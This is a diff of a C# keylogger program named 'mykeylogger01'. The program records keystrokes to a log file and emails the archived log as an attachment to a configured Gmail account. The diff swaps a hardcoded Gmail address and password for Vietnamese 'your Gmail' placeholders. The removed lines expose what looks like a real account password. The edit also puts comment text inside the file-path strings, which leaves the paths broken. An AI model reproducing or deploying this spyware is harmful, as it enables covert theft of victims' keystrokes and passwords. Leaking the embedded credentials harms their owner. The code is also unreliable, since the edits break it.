@@ -11,11 +11,11 @@ namespace mykeylogger01
     class Program
     {
         // ----------- EDIT THESE VARIABLES FOR YOUR OWN USE CASE ----------- //
-        private const string FROM_EMAIL_ADDRESS = "phannghia0982@gmail.com";
-        private const string FROM_EMAIL_PASSWORD = "mk0982675332";
-        private const string TO_EMAIL_ADDRESS = "phannghia0982@gmail.com";
-        private const string LOG_FILE_NAME = @"D:\mylog.txt";
-        private const string ARCHIVE_FILE_NAME = @"D:\mylog_archive.txt";
+        private const string FROM_EMAIL_ADDRESS = "GMAIL CỦA BẠN";
+        private const string FROM_EMAIL_PASSWORD = "MKGMAIL CỦA BẠN";
+        private const string TO_EMAIL_ADDRESS = "GMAIL CỦA BẠN";
+        private const string LOG_FILE_NAME = @"D:\mylog.txt  //đây là nơi đặt file txt của bạn";
+        private const string ARCHIVE_FILE_NAME = @"D:\mylog_archive.txt  // như trên";
         private const bool INCLUDE_LOG_AS_ATTACHMENT = true;
         private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 300;
         private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 0;
@@ -47,7 +47,7 @@ namespace mykeylogger01
                 buffer = "";
             }
 
-            FileInfo logFile = new FileInfo(@"D:\mylog.txt");
+            FileInfo logFile = new FileInfo(@"D:\mylog.txt   //Như trên");
 
             // Archive and email the log file if the max size has been reached
             if (logFile.Exists && logFile.Length >= MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL)
@@ -129,7 +129,7 @@ namespace mykeylogger01
 
                 if (INCLUDE_LOG_AS_ATTACHMENT)
                 {
-                    Attachment attachment = new Attachment(@"D:\mylog_archive.txt", System.Net.Mime.MediaTypeNames.Text.Plain);
+                    Attachment attachment = new Attachment(@"D:\mylog_archive.txt  // Như trên", System.Net.Mime.MediaTypeNames.Text.Plain);
                     message.Attachments.Add(attachment);
                 }
 
